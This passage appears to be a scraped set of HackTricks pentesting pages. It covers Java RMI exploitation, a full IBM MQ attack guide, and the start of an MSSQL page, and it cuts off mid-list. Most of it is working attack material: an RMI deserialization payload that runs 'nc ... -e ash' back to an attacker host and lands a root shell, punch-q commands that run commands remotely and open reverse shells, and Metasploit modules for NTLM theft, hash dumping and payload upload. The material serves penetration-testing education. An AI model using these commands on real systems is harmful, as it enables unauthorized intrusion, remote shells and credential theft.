'\"id\"' --bound-name plain-server --signature \"String execute(String dummy)\" --plugin GenericPrint.jar\n[+] uid=0(root) gid=0(root) groups=0(root)\nOr you can perform deserialization attacks like this:\n$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature \"String execute(String dummy)\"\n[+] Creating ysoserial payload... done.\n[+]\n[+] Attempting deserialization attack on RMI endpoint...\n[+]\n[+] \tUsing non primitive argument type java.lang.String on position 0\n[+] \tSpecified method signature is String execute(String dummy)\n[+]\n[+] \tCaught ClassNotFoundException during deserialization attack.\n[+] \tServer attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.\n[+] \tDeserialization attack probably worked :)\n‚Äã\n$ nc -vlp 4444\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::4444\nNcat: Listening on 0.0.0.0:4444\nNcat: Connection from 172.17.0.2.\nNcat: Connection from 172.17.0.2:45479.\nid\nuid=0(root) gid=0(root) groups=0(root)\nMore information can be found in these articles:\n‚Äã\nAttacking Java RMI services after JEP 290\n‚Äã\n‚Äã\nMethod Guessing\n‚Äã\n‚Äã\nremote-method-guesser\n‚Äã\n‚Äã\nrmiscout\n‚Äã\nApart from guessing, you should also look in search engines or\nGitHub\nfor the interface or even the implementation of an encountered\nRMI\nservice. The\nbound name\nand the name of the implemented class or interface can be helpful here.\nKnown Interfaces\n‚Äã\nremote-method-guesser\nmarks classes or interfaces as\nknown\nif they are listed in the tool's internal database of known\nRMI services\n. In these cases you can use the\nknown\naction to get more information on the corresponding\nRMI service\n:\n$ rmg enum 172.17.0.2 1090 | head -n 5\n[+] RMI registry bound names:\n[+]\n[+] \t- jmxrmi\n[+] \t\t--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)\n[+] \t\t    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]\n‚Äã\n$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub\n[+] Name:\n[+] \tJMX Server\n[+]\n[+] Class Name:\n[+] \t- javax.management.remote.rmi.RMIServerImpl_Stub\n[+] \t- javax.management.remote.rmi.RMIServer\n[+]\n[+] Description:\n[+] \tJava Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.\n[+] \tThis remote object is the entrypoint for initiating a JMX connection. Clients call the newClient\n[+] \tmethod usually passing a HashMap that contains connection options (e.g. credentials). The return\n[+] \tvalue (RMIConnection object) is another remote object that is when used to perform JMX related\n[+] \tactions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.\n[+]\n[+] Remote Methods:\n[+] \t- String getVersion()\n[+] \t- javax.management.remote.rmi.RMIConnection newClient(Object params)\n[+]\n[+] References:\n[+] \t- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html\n[+] \t- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi\n[+]\n[+] Vulnerabilities:\n[+]\n[+] \t-----------------------------------\n[+] \tName:\n[+] \t\tMLet\n[+]\n[+] \tDescription:\n[+] \t\tMLet is the name of an MBean that is usually available on JMX servers. It can be used to load\n[+] \t\tother MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean\n[+] \t\tis therefore most of the time equivalent to remote code execution.\n[+]\n[+] \tReferences:\n[+] \t\t- https://github.com/qtc-de/beanshooter\n[+]\n[+] \t-----------------------------------\n[+] \tName:\n[+] \t\tDeserialization\n[+]\n[+] \tDescription:\n[+] \t\tBefore CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient\n[+] \t\tmethod, resulting in insecure deserialization of untrusted objects. Despite being fixed, the\n[+] \t\tactual JMX communication using the RMIConnection object is not filtered. Therefore, if you can\n[+] \t\testablish a working JMX connection, you can also perform deserialization attacks.\n[+]\n[+] \tReferences:\n[+] \t\t- https://github.com/qtc-de/beanshooter\nShodan\nport:1099 java\nTools\n‚Äã\nremote-method-guesser\n‚Äã\n‚Äã\nrmiscout\n‚Äã\n‚Äã\nBaRMIe\n‚Äã\nHackTricks Automatic Commands\nProtocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.\nPort_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.\nProtocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Enumeration\nDescription: Perform basic enumeration of an RMI service\nCommand: rmg enum {IP} {PORT}\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n1080 - Pentesting Socks\nNext\n- Network Services Pentesting\n1414 - Pentesting IBM MQ\nLast modified\n2mo ago"
    },
    {
        "title": "1414 - Pentesting IBM MQ",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/1414-pentesting-ibmmq",
        "text": "1414 - Pentesting IBM MQ\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic information\nIBM MQ is an IBM technology to manage message queues. As other\nmessage broker\ntechnologies, it is dedicated to receive, store, process and classify information between producers and consumers.\nBy default,\nit exposes IBM MQ TCP port 1414\n. Sometimes, HTTP REST API can be exposed on port\n9443\n. Metrics (Prometheus) could also be accessed from TCP port\n9157\n.\nThe IBM MQ TCP port 1414 can be used to manipulate messages, queues, channels, ... but\nalso to control the instance\n.\nIBM provides a large technical documentation available on\nhttps://www.ibm.com/docs/en/ibm-mq\n.\nTools\nA suggested tool for easy exploitation is\npunch-q\n, with Docker usage. The tool is actively using the Python library\npymqi\n.\nFor a more manual approach, use the Python library\npymqi\n.\nIBM MQ dependencies\nare needed.\nInstalling pymqi\nIBM MQ dependencies\nneeds to be installed and loaded:\n1.\nCreate an account (IBMid) on\nhttps://login.ibm.com/\n.\n2.\nDownload IBM MQ libraries from\nhttps://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc\n. For Linux x86_64 it is\n9.0.0.4-IBM-MQC-LinuxX64.tar.gz\n.\n3.\nDecompress (\ntar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz\n).\n4.\nRun\nsudo ./mqlicense.sh\nto accept licenses terms.\nIf you are under Kali Linux, modify the file\nmqlicense.sh\n: remove/comment the following lines (between lines 105-110):\nif\n[\n${BUILD_PLATFORM}\n!=\n`\nuname\n`\n_\n`\nuname\n$\n{\nUNAME_FLAG\n}\n`\n]\nthen\necho\n\"ERROR: This package is incompatible with this system\"\necho\n\"       This package was built for\n${BUILD_PLATFORM}\n\"\nexit\n1\nfi\n5.\nInstall these packages:\nsudo\nrpm\n--prefix\n/opt/mqm\n-ivh\n--nodeps\n--force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm\nsudo\nrpm\n--prefix\n/opt/mqm\n-ivh\n--nodeps\n--force-debian MQSeriesClient-9.0.0-4.x86_64.rpm\nsudo\nrpm\n--prefix\n/opt/mqm\n-ivh\n--nodeps\n--force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm\n6.\nThen, temporary add the\n.so\nfiles to LD:\nexport LD_LIBRARY_PATH=/opt/mqm/lib64\n,\nbefore\nrunning other tools using these dependencies.\nThen, you can clone the project\npymqi\n: it contains interesting code snippets, constants, ... Or you can directly install the library with:\npip install pymqi\n.\nUsing punch-q\nWith Docker\nSimply use:\nsudo docker run --rm -ti leonjza/punch-q\n.\nWithout Docker\nClone the project\npunch-q\nthen follow the readme for installation (\npip install -r requirements.txt && python3 setup.py install\n).\nAfter, it can be used with\npunch-q\ncommand.\nEnumeration\nYou can try to enumerate the\nqueue manager name, the users, the channels and the queues\nwith\npunch-q\nor\npymqi\n.\nQueue Manager\nSometimes, there is no protection against getting the Queue Manager name:\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\ndiscover name\nQueue Manager name: MYQUEUEMGR\nChannels\npunch-q\nis using an internal (modifiable) wordlist to find existing channels. Usage example:\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd discover channels\n\"DEV.ADMIN.SVRCONN\"\nexists and was authorised.\n\"SYSTEM.AUTO.SVRCONN\"\nmight exist, but user was not authorised.\n\"SYSTEM.DEF.SVRCONN\"\nmight exist, but user was not authorised.\nIt happens that some IBM MQ instances accept\nunauthenticated\nMQ requests, so\n--username / --password\nis not needed. Of course, access rights can also vary.\nAs soon as we get one channel name (here:\nDEV.ADMIN.SVRCONN\n), we can enumerate all other channels.\nThe enumeration can basically be done with this code snippet\ncode/examples/dis_channels.py\nfrom\npymqi\n:\nimport\nlogging\nimport\npymqi\n‚Äã\nlogging\n.\nbasicConfig\n(\nlevel\n=\nlogging\n.\nINFO\n)\n‚Äã\nqueue_manager\n=\n'MYQUEUEMGR'\nchannel\n=\n'DEV.ADMIN.SVRCONN'\nhost\n=\n'172.17.0.2'\nport\n=\n'1414'\nconn_info\n=\n'%s(%s)'\n%\n(\nhost\n,\nport\n)\nuser\n=\n'admin'\npassword\n=\n'passw0rd'\n‚Äã\nprefix\n=\n'*'\n‚Äã\nargs\n=\n{\npymqi\n.\nCMQCFC\n.\nMQCACH_CHANNEL_NAME\n:\nprefix\n}\n‚Äã\nqmgr\n=\npymqi\n.\nconnect\n(\nqueue_manager\n,\nchannel\n,\nconn_info\n,\nuser\n,\npassword\n)\npcf\n=\npymqi\n.\nPCFExecute\n(\nqmgr\n)\n‚Äã\ntry\n:\nresponse\n=\npcf\n.\nMQCMD_INQUIRE_CHANNEL\n(\nargs\n)\nexcept\npymqi\n.\nMQMIError\nas\ne\n:\nif\ne\n.\ncomp\n==\npymqi\n.\nCMQC\n.\nMQCC_FAILED\nand\ne\n.\nreason\n==\npymqi\n.\nCMQC\n.\nMQRC_UNKNOWN_OBJECT_NAME\n:\nlogging\n.\ninfo\n(\n'No channels matched prefix `%s`'\n%\nprefix\n)\nelse\n:\nraise\nelse\n:\nfor\nchannel_info\nin\nresponse\n:\nchannel_name\n=\nchannel_info\n[\npymqi\n.\nCMQCFC\n.\nMQCACH_CHANNEL_NAME\n]\nlogging\n.\ninfo\n(\n'Found channel `%s`'\n%\nchannel_name\n)\n‚Äã\nqmgr\n.\ndisconnect\n()\n‚Äã\n... But\npunch-q\nalso embed that part (with more infos!). It can be launch with:\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN show channels\n-p\n'*'\nShowing channels with prefix:\n\"*\"\n..\n.\n‚Äã\n|\nName\n|\nType\n|\nMCA\nUID\n|\nConn Name\n|\nXmit Queue\n|\nDescription\n|\nSSL Cipher\n|\n|\n----------------------\n|\n-------------------\n|\n---------\n|\n-----------\n|\n------------\n|\n-----------------\n|\n------------\n|\n|\nDEV.ADMIN.SVRCONN\n|\nServer-connection\n|\n|\n|\n|\n|\n|\n|\nDEV.APP.SVRCONN\n|\nServer-connection\n|\napp\n|\n|\n|\n|\n|\n|\nSYSTEM.AUTO.RECEIVER\n|\nReceiver\n|\n|\n|\n|\nAuto-defined by\n|\n|\n|\nSYSTEM.AUTO.SVRCONN\n|\nServer-connection\n|\n|\n|\n|\nAuto-defined by\n|\n|\n|\nSYSTEM.DEF.AMQP\n|\nAMQP\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.CLUSRCVR\n|\nCluster-receiver\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.CLUSSDR\n|\nCluster-sender\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.RECEIVER\n|\nReceiver\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.REQUESTER\n|\nRequester\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.SENDER\n|\nSender\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.SERVER\n|\nServer\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.SVRCONN\n|\nServer-connection\n|\n|\n|\n|\n|\n|\n|\nSYSTEM.DEF.CLNTCONN\n|\nClient-connection\n|\n|\n|\n|\n|\n|\nQueues\nThere is a code snippet with\npymqi\n(\ndis_queues.py\n) but\npunch-q\npermits to retrieve more pieces of info about the queues:\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN show queues\n-p\n'*'\nShowing queues with prefix:\n\"*\"\n..\n.\n|\nCreated\n|\nName\n|\nType\n|\nUsage\n|\nDepth\n|\nRmt. QM\n|\nRmt. Qu\n|\nDescription\n|\n|\n|\n|\n|\n|\n|\nGR Name\n|\neue Nam\n|\n|\n|\n|\n|\n|\n|\n|\n|\ne\n|\n|\n|\n-----------\n|\n----------------------\n|\n--------\n|\n---------\n|\n--------\n|\n---------\n|\n---------\n|\n-----------------------------------\n|\n|\n2023\n-10-1\n|\nDEV.DEAD.LETTER.QUEU\n|\nLocal\n|\nNormal\n|\n0\n|\n|\n|\n|\n|\n0\n18.35\n.1\n|\nE\n|\n|\n|\n|\n|\n|\n|\n|\n9\n|\n|\n|\n|\n|\n|\n|\n|\n|\n2023\n-10-1\n|\nDEV.QUEUE.1\n|\nLocal\n|\nNormal\n|\n0\n|\n|\n|\n|\n|\n0\n18.35\n.1\n|\n|\n|\n|\n|\n|\n|\n|\n|\n9\n|\n|\n|\n|\n|\n|\n|\n|\n|\n2023\n-10-1\n|\nDEV.QUEUE.2\n|\nLocal\n|\nNormal\n|\n0\n|\n|\n|\n|\n|\n0\n18.35\n.1\n|\n|\n|\n|\n|\n|\n|\n|\n|\n9\n|\n|\n|\n|\n|\n|\n|\n|\n|\n2023\n-10-1\n|\nDEV.QUEUE.3\n|\nLocal\n|\nNormal\n|\n0\n|\n|\n|\n|\n|\n0\n18.35\n.1\n|\n|\n|\n|\n|\n|\n|\n|\n|\n9\n|\n|\n|\n|\n|\n|\n|\n|\n# Truncated\nExploit\nDump messages\nYou can target queue(s)/channel(s) to sniff out / dump messages from them (non-destructive operation).\nExamples:\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN messages sniff\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN messages dump\nDo not hesitate to iterate on all identified queues.\nCode execution\nSome details before continuing: IBM MQ can be controlled though multiple ways: MQSC, PCF, Control Command. Some general lists can be found in\nIBM MQ documentation\n.\nPCF\n(\nProgrammable Command Formats\n) is what we are focused on to interact remotely with the instance.\npunch-q\nand furthermore\npymqi\nare based on PCF interactions.\nYou can find a list of PCF commands:\n‚Äã\nFrom PCF documentation\n, and\n‚Äã\nfrom constants\n.\nOne interesting command is\nMQCMD_CREATE_SERVICE\nand its documentation is available\nhere\n. It takes as argument a\nStartCommand\npointing to a local program on the instance (example:\n/bin/sh\n).\nThere is also a warning of the command in the docs:\n\"Attention: This command allows a user to run an arbitrary command with mqm authority. If granted rights to use this command, a malicious or careless user could define a service which damages your systems or data, for example, by deleting essential files.\"\nNote: always according to IBM MQ documentation (Administration Reference), there is also an HTTP endpoint at\n/admin/action/qmgr/{qmgrName}/mqsc\nto run the equivalent MQSC command for service creation (\nDEFINE SERVICE\n). This aspect is not covered yet here.\nThe service creation / deletion with PCF for remote program execution can be done by\npunch-q\n:\nExample 1\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN\ncommand\nexecute\n--cmd\n\"/bin/sh\"\n--args\n\"-c id\"\nIn the logs of IBM MQ, you can read the command is successfully executed:\n2023\n-10-10T19:13:01.713Z AMQ5030I: The Command\n'808544aa7fc94c48'\nhas started. ProcessId\n(\n618\n)\n.\n[\nArithInsert1\n(\n618\n)\n, CommentInsert1\n(\n808544aa7fc94c48\n)]\nYou can also enumerate existing programs on the machine (here\n/bin/doesnotexist\n... does not exist):\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN\ncommand\nexecute\n--cmd\n\"/bin/doesnotexist\"\n--arg\ns\n\"whatever\"\nCommand: /bin/doesnotexist\nArguments:\n-c\nid\nService Name: 6e3ef5af652b4436\n‚Äã\nCreating service\n..\n.\nStarting service\n..\n.\nThe program\n'/bin/doesnotexist'\nis not available on the remote system.\nGiving the\nservice\n0\nsecond\n(\ns\n)\nto live\n..\n.\nCleaning up service\n..\n.\nDone\nBe aware that the program launch is asynchronous. So you need a second item to leverage the exploit\n(listener for reverse shell, file creation on different service, data exfiltration through network ...)\nExample 2\nFor easy reverse shell,\npunch-q\nproposes also two reverse shell payloads :\nOne with bash\nOne with perl\nOf course you can build a custom one with the\nexecute\ncommand.\nFor bash:\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN\ncommand\nreverse\n-i\n192.168\n.0.16\n-p\n4444\nFor perl:\n‚ùØ\nsudo\ndocker\nrun\n--rm\n-ti\nleonjza/punch-q\n--host\n172.17\n.0.2\n--port\n1414\n--username\nadmin\n--password\npassw0rd\n--channel\nDEV.ADMIN.SVRCONN\ncommand\nreverse\n-i\n192.168\n.0.16\n-p\n4444\nCustom PCF\nYou can dig into the IBM MQ documentation and directly use\npymqi\npython library to test specific PCF command not implemented in\npunch-q\n.\nExample:\nimport\npymqi\n‚Äã\nqueue_manager\n=\n'MYQUEUEMGR'\nchannel\n=\n'DEV.ADMIN.SVRCONN'\nhost\n=\n'172.17.0.2'\nport\n=\n'1414'\nconn_info\n=\n'%s(%s)'\n%\n(\nhost\n,\nport\n)\nuser\n=\n'admin'\npassword\n=\n'passw0rd'\n‚Äã\nqmgr\n=\npymqi\n.\nconnect\n(\nqueue_manager\n,\nchannel\n,\nconn_info\n,\nuser\n,\npassword\n)\npcf\n=\npymqi\n.\nPCFExecute\n(\nqmgr\n)\n‚Äã\ntry\n:\n# Replace here with your custom PCF args and command\n# The constants can be found in pymqi/code/pymqi/CMQCFC.py\nargs\n=\n{\npymqi\n.\nCMQCFC\n.\nxxxxx\n:\n\"value\"\n}\nresponse\n=\npcf\n.\nMQCMD_CUSTOM_COMMAND\n(\nargs\n)\nexcept\npymqi\n.\nMQMIError\nas\ne\n:\nprint\n(\n\"Error\"\n)\nelse\n:\n# Process response\n‚Äã\nqmgr\n.\ndisconnect\n()\n‚Äã\nIf you cannot find the constant names, you can refer to the\nIBM MQ documentation\n.\nExample for\nMQCMD_REFRESH_CLUSTER\n(Decimal = 73). It needs the parameter\nMQCA_CLUSTER_NAME\n(Decimal = 2029) which can be\n*\n(Doc: ):\nimport\npymqi\n‚Äã\nqueue_manager\n=\n'MYQUEUEMGR'\nchannel\n=\n'DEV.ADMIN.SVRCONN'\nhost\n=\n'172.17.0.2'\nport\n=\n'1414'\nconn_info\n=\n'%s(%s)'\n%\n(\nhost\n,\nport\n)\nuser\n=\n'admin'\npassword\n=\n'passw0rd'\n‚Äã\nqmgr\n=\npymqi\n.\nconnect\n(\nqueue_manager\n,\nchannel\n,\nconn_info\n,\nuser\n,\npassword\n)\npcf\n=\npymqi\n.\nPCFExecute\n(\nqmgr\n)\n‚Äã\ntry\n:\nargs\n=\n{\n2029\n:\n\"*\"\n}\nresponse\n=\npcf\n.\nMQCMD_REFRESH_CLUSTER\n(\nargs\n)\nexcept\npymqi\n.\nMQMIError\nas\ne\n:\nprint\n(\n\"Error\"\n)\nelse\n:\nprint\n(\nresponse\n)\n‚Äã\nqmgr\n.\ndisconnect\n()\nTesting environment\nIf you want to test the IBM MQ behavior and exploits, you can set up a local environment based on Docker:\n1.\nHaving an account on ibm.com and cloud.ibm.com.\n2.\nCreate a containerized IBM MQ with:\nsudo\ndocker\npull icr.io/ibm-messaging/mq:9.3.2.0-r2\nsudo\ndocker\nrun\n-e\nLICENSE\n=\naccept\n-e\nMQ_QMGR_NAME\n=\nMYQUEUEMGR\n-p1414:1414\n-p9157:9157\n-p9443:9443\n--name\ntesting-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2\nBy default, the authentication is enabled, the username is\nadmin\nand the password is\npassw0rd\n(Environment variable\nMQ_ADMIN_PASSWORD\n). Here, the queue manager name has been set to\nMYQUEUEMGR\n(variable\nMQ_QMGR_NAME\n).\nYou should have the IBM MQ up and running with its ports exposed:\n‚ùØ\nsudo\ndocker\nps\nCONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES\n58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2\n\"runmqdevserver\"\n3\nseconds ago   Up\n3\nseconds\n0.0\n.0.0:1414-\n>\n1414\n/tcp,\n0.0\n.0.0:9157-\n>\n9157\n/tcp,\n0.0\n.0.0:9443-\n>\n9443\n/tcp   testing-ibmmq\nThe old version of IBM MQ docker images are at: https://hub.docker.com/r/ibmcom/mq/.\nReferences\n‚Äã\nmgeeky's gist - \"Practical IBM MQ Penetration Testing notes\"\n‚Äã\n‚Äã\nMQ Jumping - DEFCON 15\n‚Äã\n‚Äã\nIBM MQ documentation\n‚Äã\nNetwork Services Pentesting -\nPrevious\n1098/1099/1050 - Pentesting Java RMI - RMI-IIOP\nNext\n- Network Services Pentesting\n1433 - Pentesting MSSQL - Microsoft SQL Server\nLast modified\n20d ago"
    },
    {
        "title": "1433 - Pentesting MSSQL - Microsoft SQL Server",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server",
        "text": "1433 - Pentesting MSSQL - Microsoft SQL Server\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nBasic Information\nMicrosoft SQL Server\nis a\nrelational database\nmanagement system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications‚Äîwhich may run either on the same computer or on another computer across a network (including the Internet).\nFrom\nwikipedia\n.\nDefault port:\n1433\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM\nDefault MS-SQL System Tables\nmaster Database\n: Records all the system-level information for an instance of SQL Server.\nmsdb Database\n: Is used by SQL Server Agent for scheduling alerts and jobs.\nmodel Database\n: Is used as the template for all databases created on the instance of SQL Server. Modifications made to the model database, such as database size, collation, recovery model, and other database options, are applied to any databases created afterwards.\nResource Databas\n: Is a read-only database that contains system objects that are included with SQL Server. System objects are physically persisted in the Resource database, but they logically appear in the sys schema of every database.\ntempdb Database\n: Is a work-space for holding temporary objects or intermediate result sets.\nEnumeration\nAutomatic Enumeration\nIf you don't know nothing about the service:\nnmap\n--script\nms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port\n=\n1433\n,mssql.username\n=\nsa,mssql.password\n=\n,mssql.instance-name\n=\nMSSQLSERVER\n-sV\n-p\n1433\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/mssql/mssql_ping\nIf you\ndon't\nhave credentials\nyou can try to guess them. You can use nmap or metasploit. Be careful, you can\nblock accounts\nif you fail login several times using an existing username.\nMetasploit (need creds)\n#Set USERNAME, RHOSTS and PASSWORD\n#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used\n‚Äã\n#Steal NTLM\nmsf\n>\nuse auxiliary/admin/mssql/mssql_ntlm_stealer\n#Steal NTLM hash, before executing run Responder\n‚Äã\n#Info gathering\nmsf\n>\nuse admin/mssql/mssql_enum\n#Security checks\nmsf\n>\nuse admin/mssql/mssql_enum_domain_accounts\nmsf\n>\nuse admin/mssql/mssql_enum_sql_logins\nmsf\n>\nuse auxiliary/admin/mssql/mssql_findandsampledata\nmsf\n>\nuse auxiliary/scanner/mssql/mssql_hashdump\nmsf\n>\nuse auxiliary/scanner/mssql/mssql_schemadump\n‚Äã\n#Search for insteresting data\nmsf\n>\nuse auxiliary/admin/mssql/mssql_findandsampledata\nmsf\n>\nuse auxiliary/admin/mssql/mssql_idf\n‚Äã\n#Privesc\nmsf\n>\nuse exploit/windows/mssql/mssql_linkcrawler\nmsf\n>\nuse admin/mssql/mssql_escalate_execute_as\n#If the user has IMPERSONATION privilege, this will try to escalate\nmsf\n>\nuse admin/mssql/mssql_escalate_dbowner\n#Escalate from db_owner to sysadmin\n‚Äã\n#Code execution\nmsf\n>\nuse admin/mssql/mssql_exec\n#Execute commands\nmsf\n>\nuse exploit/windows/mssql/mssql_payload\n#Uploads and execute a payload\n‚Äã\n#Add new admin user from meterpreter session\nmsf\n>\nuse windows/manage/mssql_local_auth_bypass\n‚Äã\nBrute force\n‚Äã\nManual Enumeration\nLogin\n# Using Impacket mssqlclient.py\nmssqlclient.py\n[\n-db volume\n]\n<\nDOMAIN\n>\n/\n<\nUSERNAME\n>\n:\n<\nPASSWORD\n>\n@\n<\nIP\n>\n## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine\nmssqlclient.py\n[\n-db volume\n]\n-windows-auth\n<\nDOMAIN\n>\n/\n<\nUSERNAME\n>\n:\n<\nPASSWORD\n>\n@\n<\nIP\n>\n‚Äã\n# Using sqsh\nsqsh\n-S\n<\nIP\n>\n-U\n<\nUsername\n>\n-P\n<\nPassword\n>\n-D\n<\nDatabase\n>\n## In case Windows Auth using \".\" as domain name for local user\nsqsh\n-S\n<\nIP\n>\n-U\n.\n\\\\\n<\nUsername\n>\n-P\n<\nPassword\n>\n-D\n<\nDatabase\n>\n## In sqsh you need to use GO after writting the query to send it\n1\n>\nselect\n1\n;\n2\n>\ngo\nCommon Enumeration\n# Get version\nselect\n@\n@version\n;\n# Get user\nselect\nuser_name\n();\n# Get databases\nSELECT\nname\nFROM\nmaster\n.\ndbo\n.\nsysdatabases\n;\n# Use database\nUSE\nmaster\n‚Äã\n#Get table names\nSELECT\n*\nFROM\n<\ndatabaseName\n>\n.\nINFORMATION_SCHEMA\n.\nTABLES\n;\n#List Linked Servers\nEXEC\nsp_linkedservers\nSELECT\n*\nFROM\nsys\n.\nservers\n;\n#List 